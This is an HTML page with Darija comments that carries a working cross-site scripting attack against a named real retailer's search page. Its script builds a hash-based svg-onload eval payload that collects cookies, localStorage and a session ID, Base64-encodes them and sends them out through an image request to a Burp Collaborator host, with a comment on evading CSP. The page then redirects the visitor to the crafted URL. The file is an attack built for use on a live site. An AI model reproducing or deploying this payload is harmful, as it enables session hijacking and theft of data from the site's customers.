<!DOCTYPE html>
<html>
<body>
    <script>
        // الكود اللي غيتنفذ وسط Decathlon
        let payload = `
            (function(){
                var data = {
                    info: "SESS_HIJACK_SUCCESS",
                    cookies: document.cookie,
                    ls: JSON.stringify(localStorage),
                    osid: document.cookie.match(/osid=([^;]+)/)?.[1] || "not_found"
                };
                
                // الرابط ديال Burp Collaborator ديالك
                var collab = "https://zvyhtnk8jyjp14ieruxdawfp9gf731rq.oastify.com";
                
                // صيفط الداتا مشفرة بـ Base64
                var b64Data = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
                
                // استعملنا Image() حيت كتهرب من الـ CSP أحسن من fetch
                var exfil = new Image();
                exfil.src = collab + "/?leak=" + b64Data;
            })();
        `;

        // تشفير الـ Payload باش يدوز فـ الـ Hash
        let encodedPayload = encodeURIComponent(payload);

        // الرابط اللي غيضرب Decathlon عن طريق الـ Hash (#)
        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encodedPayload + "'))>";

        // تنفيذ التحويل
        window.location.href = finalTarget;
    </script>
</body>
</html>
